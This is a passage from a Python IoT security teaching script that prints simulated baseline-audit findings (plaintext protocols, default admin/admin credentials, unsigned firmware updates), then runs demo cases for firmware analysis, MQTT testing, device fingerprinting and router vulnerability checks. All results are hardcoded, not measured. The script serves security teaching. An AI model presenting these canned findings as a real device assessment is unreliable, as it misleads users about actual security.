        self.检查结果 = {}

    def 执行基线检查(self):
        """执行完整的安全基线检查"""
        print("=" * 70)
        print("[安全基线] IoT设备安全基线合规检查")
        print("=" * 70)

        总检查数 = 0
        不合规数 = 0
        部分合规数 = 0
        合规数 = 0

        for 类别, 检查列表 in self.基线检查项.items():
            print(f"\n  [{'='*20} {类别} {'='*20}]")
            print(f"  {'检查项':<20} {'状态':<10} {'风险':<6} {'实际配置'}")
            print(f"  {'-'*20} {'-'*10} {'-'*6} {'-'*40}")

            类别结果 = []
            for item in 检查列表:
                print(f"  {item['检查项']:<20} {item['状态']:<10} "
                      f"{item['风险']:<6} {item['实际'][:40]}")

                类别结果.append(item)
                总检查数 += 1
                if item["状态"] == "不合规":
                    不合规数 += 1
                elif item["状态"] == "部分合规":
                    部分合规数 += 1
                else:
                    合规数 += 1

            self.检查结果[类别] = 类别结果

        print(f"\n  [基线检查汇总]")
        print(f"    总检查项: {总检查数}")
        print(f"    合规    : {合规数}")
        print(f"    部分合规: {部分合规数}")
        print(f"    不合规  : {不合规数}")
        print(f"    合规率  : {(合规数 + 部分合规数 * 0.5) / 总检查数 * 100:.1f}%")

        return {"总检查数": 总检查数, "合规": 合规数,
                "部分合规": 部分合规数, "不合规": 不合规数}

    def 评估加密通信(self):
        """评估设备加密通信安全"""
        print("\n" + "-" * 70)
        print("[加密评估] 加密通信安全专项评估...")
        print("-" * 70)

        评估项 = self.检查结果.get("加密通信", [])

        print(f"\n  [TLS/SSL配置分析]")
        print(f"    TLS版本    : 未启用 (应使用TLS 1.2+)")
        print(f"    密码套件   : N/A (应禁用弱套件)")
        print(f"    证书有效期 : 自签名证书已过期")
        print(f"    HSTS       : 未启用")
        print(f"    证书钉扎   : 未配置")

        print(f"\n  [明文协议检测]")
        明文协议 = [
            ("Telnet (TCP 23)", "严重", "明文传输凭据和命令"),
            ("HTTP (TCP 80)", "高", "Web管理界面明文传输"),
            ("MQTT (TCP 1883)", "高", "MQTT消息明文传输"),
            ("RTSP (TCP 554)", "中", "视频流明文传输"),
            ("SNMP (UDP 161)", "中", "SNMP v1/v2c明文社区字符串"),
        ]
        for 协议, 风险, 说明 in 明文协议:
            print(f"    {协议:<20} 风险:{风险:<6} {说明}")

        print(f"\n  [加密通信合规率]: 0/5 (0%)")
        print(f"  [!] 所有加密通信检查项均不合规")

    def 评估认证机制(self):
        """评估设备认证机制安全"""
        print("\n" + "-" * 70)
        print("[认证评估] 认证机制安全专项评估...")
        print("-" * 70)

        print(f"\n  [认证机制分析]")
        评估 = [
            ("密码策略", "无复杂度要求", "8位+大小写+数字+特殊字符", "严重"),
            ("默认密码", "admin/admin", "强制修改", "严重"),
            ("失败锁定", "无锁定机制", "5次失败锁定15分钟", "高"),
            ("会话管理", "无超时", "15分钟会话超时", "中"),
            ("双因素认证", "不支持", "支持TOTP/SMS 2FA", "中"),
            ("密码存储", "MD5Crypt", "bcrypt/scrypt/Argon2", "高"),
            ("API认证", "无认证", "API Key + HMAC签名", "高"),
        ]

        print(f"  {'机制':<15} {'当前状态':<15} {'标准要求':<25} {'风险'}")
        print(f"  {'-'*15} {'-'*15} {'-'*25} {'-'*6}")
        for 机制, 当前, 标准, 风险 in 评估:
            print(f"  {机制:<15} {当前:<15} {标准:<25} {风险}")

        print(f"\n  [认证安全合规率]: 0/7 (0%)")
        print(f"  [!] 认证机制存在严重安全缺陷")

    def 验证更新机制(self):
        """验证固件更新机制安全性"""
        print("\n" + "-" * 70)
        print("[更新验证] 固件更新机制安全验证...")
        print("-" * 70)

        print(f"\n  [固件更新流程分析]")
        流程 = [
            ("1. 检查更新", "设备->云端", "HTTP明文", "高",
             "更新检查请求未加密，可被MITM篡改"),
            ("2. 下载固件", "设备<-云端", "HTTP明文下载", "严重",
             "固件下载未加密，可被中间人替换"),
            ("3. 完整性校验", "设备本地", "无校验", "严重",
             "固件无哈希/签名验证，可刷入恶意固件"),
            ("4. 签名验证", "设备本地", "无签名验证", "严重",
             "未实现固件签名验证机制"),
            ("5. 安装固件", "设备本地", "直接写入Flash", "高",
             "写入前无安全校验，无回滚保护"),
            ("6. 重启验证", "设备本地", "无安全启动验证", "高",
             "重启后无Secure Boot验证启动链完整性"),
        ]

        print(f"  {'步骤':<18} {'方向':<15} {'传输方式':<15} {'风险':<6} {'说明'}")
        print(f"  {'-'*18} {'-'*15} {'-'*15} {'-'*6} {'-'*40}")
        for 步骤, 方向, 传输, 风险, 说明 in 流程:
            print(f"  {步骤:<18} {方向:<15} {传输:<15} {风险:<6} {说明[:40]}")

        print(f"\n  [更新机制安全合规率]: 0/6 (0%)")
        print(f"  [!] 固件更新全流程存在安全缺陷，可被完全劫持")

    def 生成基线报告(self):
        """生成安全基线检查报告"""
        print("\n" + "=" * 70)
        print("[基线报告] IoT安全基线检查综合报告")
        print("=" * 70)

        # 计算总体合规率
        总数 = 0
        不合规 = 0
        风险统计 = Counter()

        for 类别, 检查列表 in self.检查结果.items():
            for item in 检查列表:
                总数 += 1
                if item["状态"] == "不合规":
                    不合规 += 1
                    风险统计[item["风险"]] += 1

        合规率 = (总数 - 不合规) / 总数 * 100 if 总数 > 0 else 0

        print(f"\n  [总体合规情况]")
        print(f"    检查项总数: {总数}")
        print(f"    不合规项  : {不合规}")
        print(f"    合规率    : {合规率:.1f}%")

        print(f"\n  [不合规项风险分布]")
        for 风险 in ["严重", "高", "中", "低"]:
            print(f"    {风险}: {风险统计.get(风险, 0)} 项")

        print(f"\n  [参考标准]")
        标准 = [
            "OWASP IoT Top 10 (2021)",
            "NIST SP 800-213 IoT设备安全基线指南",
            "ENISA IoT安全基线要求",
            "GB/T 36478 物联网安全参考模型",
            "GSMA IoT安全评估指南",
        ]
        for s in 标准:
            print(f"    - {s}")

        print(f"\n  [整改建议]")
        建议 = [
            "P0(立即): 禁用Telnet，启用SSH + TLS",
            "P0(立即): 实现固件签名验证 + 安全启动",
            "P0(立即): 强制修改默认密码，实施密码策略",
            "P1(短期): 启用TLS 1.2+加密所有Web/MQTT/RTSP通信",
            "P1(短期): 实施登录失败锁定 + 会话超时",
            "P1(短期): 固件下载使用HTTPS + 哈希校验",
            "P2(中期): IoT网络与用户网络VLAN隔离",
            "P2(中期): 部署远程Syslog + 安全事件告警",
            "P3(长期): 实现Secure Boot全链验证",
            "P3(长期): 部署IoT安全运营平台(SIEM)持续监控",
        ]
        for s in 建议:
            print(f"    {s}")

        return {"合规率": 合规率, "不合规项": 不合规, "总数": 总数}


# ============================================================================
# 主函数：演示所有IoT安全案例的运行
# ============================================================================

def 主函数():
    """主函数：演示所有物联网安全实战案例"""
    print("\n")
    print("╔" + "═" * 68 + "╗")
    print("║" + " 物联网安全实战案例工具集 ".center(50) + "║")
    print("║" + " IoT Security Practical Case Study ".center(50) + "║")
    print("╚" + "═" * 68 + "╝")
    print()
    print("  [安全声明]")
    print("  本工具仅用于授权安全测试和网络安全教学研究。")
    print("  严禁用于任何非法攻击和未授权渗透测试。")
    print("  使用者须遵守相关法律法规，获得目标所有者授权。")
    print()

    # ===== 案例一：IoT固件分析 =====
    print("\n" + "█" * 70)
    print("█ 案例一：IoT固件分析工具".ljust(69) + "█")
    print("█" * 70)

    分析器 = IoT固件分析器()
    分析器.识别固件头("router_firmware_v1.2.bin")
    分析器.解包固件("router_firmware_v1.2.bin")
    分析器.提取文件系统()
    分析器.检测硬编码凭据()
    分析器.检测后门()
    分析器.生成分析报告()

    # ===== 案例二：MQTT协议安全检测 =====
    print("\n\n" + "█" * 70)
    print("█ 案例二：MQTT协议安全检测".ljust(69) + "█")
    print("█" * 70)

    mqtt检测器 = MQTT安全检测器()
    mqtt检测器.连接Broker()
    mqtt检测器.检测未授权访问()
    mqtt检测器.检测通配符订阅()
    mqtt检测器.检测消息注入()
    mqtt检测器.生成检测报告()

    # ===== 案例三：IoT设备指纹识别 =====
    print("\n\n" + "█" * 70)
    print("█ 案例三：IoT设备指纹识别".ljust(69) + "█")
    print("█" * 70)

    指纹识别器 = IoT设备指纹识别器()
    指纹识别器.扫描网络("192.168.1.0/24")
    指纹识别器.识别设备类型()
    指纹识别器.端口与服务扫描()
    指纹识别器.操作系统检测()
    指纹识别器.生成指纹报告()

    # ===== 案例四：固件漏洞分析 =====
    print("\n\n" + "█" * 70)
    print("█ 案例四：固件漏洞分析".ljust(69) + "█")
    print("█" * 70)

    漏洞分析器 = 固件漏洞分析器()
    目标设备 = {
        "IP": "192.168.1.1",
        "MAC": "50:BD:27:AB:CD:01",
        "厂商": "TP-Link",
        "型号": "TL-WR886N",
        "固件版本": "v1.2.3"
    }
    漏洞分析器.检测默认密码(目标设备)
    漏洞分析器.检测调试接口(目标设备)
    漏洞分析器.检测Web管理漏洞(目标设备)
    漏洞分析器.匹配CVE漏洞(目标设备)
    漏洞分析器.生成漏洞报告()

    # ===== 案例五：IoT网络流量分析 =====
    print("\n\n" + "█" * 70)
    print("█ 案例五：IoT网络流量分析".ljust(69) + "█")
    print("█" * 70)

    流量分析器 = IoT流量分析器()
    流量分析器.建立流量基线()
    流量分析器.检测异常通信()
    流量分析器.识别C2通信()
    流量分析器.检测数据外泄()
    流量分析器.生成流量分析报告()

    # ===== 案例六：IoT安全基线检查 =====
    print("\n\n" + "█" * 70)
    print("█ 案例六：IoT安全基线检查".ljust(69) + "█")
    print("█" * 70)

    基线检查器 = IoT安全基线检查器()
    基线检查器.执行基线检查()
    基线检查器.评估加密通信()
    基线检查器.评估认证机制()
    基线检查器.验证更新机制()
    基线检查器.生成基线报告()

    # ===== 总结 =====
    print("\n\n" + "=" * 70)
    print("  [全部案例演示完成]")
    print("=" * 70)
    print(f"  演示时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  涵盖主题: 固件分析 / MQTT安全 / 设备指纹 / 漏洞分析 / 流量分析 / 基线检查")
    print()
    print("  [安全提示]")
    print("  1. 所有检测均在模拟环境中进行，不涉及真实设备")
    print("  2. 实际安全测试须获得书面授权")
    print("  3. 发现的安全漏洞应及时通报厂商和CERT")
    print("  4. 遵守《网络安全法》《数据安全法》《个人信息保护法》")
    print("=" * 70)


if __name__ == "__main__":
    主函数()
